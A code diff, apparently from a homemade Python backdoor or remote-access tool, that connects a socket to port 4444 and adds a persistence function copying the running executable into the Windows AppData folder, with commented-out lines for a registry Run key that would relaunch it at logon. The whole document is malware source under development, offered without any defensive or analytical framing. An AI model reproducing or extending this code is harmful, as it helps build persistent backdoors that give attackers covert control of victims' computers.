@@ -1,6 +1,9 @@
 import socket
 import subprocess
 import json
+import shutil
+import os
+import sys
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.connect(("127.0.0.1",4444))
 
@@ -35,6 +38,20 @@ def download_file(file_name,target):
     target.settimeout(None)
     f.close()
 
+def persist(copy_name): #persist(reg_name, copy_name)
+    file_location = os.environ['appdata'] + '\\' + copy_name
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            #subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
+            #reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
+        else:
+            print("Already exists.")
+    except Exception as e:
+       print(e)
+
+
+       
 def start_comm():
     while True:
         try:
